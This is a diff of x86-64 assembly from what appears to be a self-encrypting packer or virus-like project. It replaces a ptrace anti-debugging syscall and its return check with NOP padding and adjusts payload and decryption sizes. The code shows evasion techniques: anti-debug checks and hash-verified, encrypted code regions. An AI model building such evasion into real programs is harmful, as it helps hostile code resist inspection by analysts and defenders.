@@ -10,18 +10,46 @@ syscalls:
 	cmp rax, 0xff
 	jg end_ft_end
 
-	mov rdi, 0 ; syscalls
-	mov rsi, 0 ; syscalls
-	mov rdx, 1 ; syscalls
-	mov r10, 0 ; syscalls
-	mov rax, 0x65 ; syscalls
-	syscall ; syscalls
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+	nop ; 28 nop to replace ptrace syscall
+;	mov rdi, 0 ; syscalls
+;	mov rsi, 0 ; syscalls
+;	mov rdx, 1 ; syscalls
+;	mov r10, 0 ; syscalls
+;	mov rax, 0x65 ; syscalls
+;	syscall ; syscalls
 
 hash:
 ;    mov edi, 5381 ;hash
 	mov edi, r13d ; r13 got result of hash loader
 ;    mov r13d, edi ;hash bis
-    mov rdx, 0x10 ;size payload + bis_size a modifier 0x1f4f
+    mov rdx, 0x29f0 ;size payload + bis_size a modifier 0x1f4f
     pushfq ; verif step by step
     mov rsi, 0 ;inc
 	lea rcx, [syscalls] ;adresse syscalls
@@ -51,8 +79,17 @@ hash_loop2:
 		jmp -1 ; sortie
 after_exit_5:
 ;
-	cmp eax, 0 ; syscalls
-	jg end_ft_end ; jg FOR DEBUG, jl FOR TRUE, je FOR REVERSE ; syscalls
+	nop ; 9 nop to replace cmp return of ptrace syscall
+	nop ; 9 nop to replace cmp return of ptrace syscall
+	nop ; 9 nop to replace cmp return of ptrace syscall
+	nop ; 9 nop to replace cmp return of ptrace syscall
+	nop ; 9 nop to replace cmp return of ptrace syscall
+	nop ; 9 nop to replace cmp return of ptrace syscall
+	nop ; 9 nop to replace cmp return of ptrace syscall
+	nop ; 9 nop to replace cmp return of ptrace syscall
+	nop ; 9 nop to replace cmp return of ptrace syscall
+;	cmp eax, 0 ; syscalls
+;	jg end_ft_end ; jg FOR DEBUG, jl FOR TRUE, je FOR REVERSE ; syscalls
 ;
 	jmp after_exit_2
 	jmp2:
@@ -106,7 +143,7 @@ ft_end:
 mov r9, 8 ; NB_TIMING MOODULABLE ; dechiffrement
 mov r13, 2 ; mark this zone as end ; dechiffrement
 dechiffrement_loop2:
-	mov eax, 0x2831;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
+	mov eax, 0x2818;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
 	shr eax, 2 ; dechiffrement & chiffrement
 ;
 	jmp after_exit_3
